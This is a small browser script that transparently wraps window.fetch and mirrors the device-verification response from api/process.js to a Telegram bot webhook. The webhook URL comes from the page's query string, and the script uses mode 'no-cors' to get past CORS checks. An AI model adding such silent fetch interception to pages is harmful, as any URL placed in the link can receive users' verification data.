/**
 * webhook-bridge.js
 *
 * script.js posts the device-verification result to api/process.js, but it
 * never notifies the Telegram bot's webhook (?webhook=... in the URL), so
 * the bot never sends a confirmation message to the user.
 *
 * This script must be loaded BEFORE script.js. It transparently wraps
 * window.fetch: every call behaves exactly as before, except calls to
 * api/process.js are also mirrored to the bot's webhook URL with the same
 * JSON response, so the /onWebhook command actually fires.
 *
 * No changes to script.js are required.
 */
(function () {
  const originalFetch = window.fetch;

  const params = new URLSearchParams(window.location.search);
  const webhookUrl = params.get('webhook');

  window.fetch = async function (input, init) {
    const url = typeof input === 'string' ? input : (input && input.url) || '';
    const response = await originalFetch(input, init);

    // Only mirror the specific verification-result call, and only if a
    // webhook URL was actually provided in the page's query string.
    if (webhookUrl && url.indexOf('api/process.js') !== -1) {
      try {
        // Clone so script.js can still read the original response body itself.
        const clone = response.clone();
        clone.json().then(function (data) {
          // mode: 'no-cors' is required here - this webhook endpoint is a
          // server-to-server style receiver, not CORS-enabled for browser
          // calls. A normal 'cors' POST gets silently blocked by the
          // preflight check and never leaves the browser at all. Under
          // no-cors we can't read the response (it's opaque), but the
          // request genuinely gets sent and the JSON body arrives intact -
          // that's all we need since nothing here reads the reply.
          originalFetch(webhookUrl, {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify(data)
          }).then(function () {
            console.log('webhook-bridge: webhook POST sent (no-cors, response not readable)');
          }).catch(function (err) {
            console.error('webhook-bridge: failed to notify bot webhook', err);
          });
        }).catch(function (err) {
          console.error('webhook-bridge: could not read response to forward', err);
        });
      } catch (err) {
        console.error('webhook-bridge: unexpected error', err);
      }
    }

    return response;
  };
})();
